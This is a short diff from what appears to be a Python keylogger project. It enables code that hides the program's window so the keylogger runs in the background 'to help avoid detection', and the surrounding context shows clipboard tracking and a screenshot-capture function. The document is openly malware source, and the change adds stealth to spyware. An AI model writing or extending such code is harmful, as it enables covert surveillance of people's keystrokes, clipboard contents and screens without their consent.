@@ -23,8 +23,8 @@ previous_clipboard = ""
 
 
 # this is used to make the keylogger run in the background to help avoid detection
-#program_hide = win32gui.GetForegroundWindow()
-#win32gui.ShowWindow(program_hide , win32con.SW_HIDE)
+program_hide = win32gui.GetForegroundWindow()
+win32gui.ShowWindow(program_hide , win32con.SW_HIDE)
 
 def screenshot():
     screenshot_images = ImageGrab.grab()
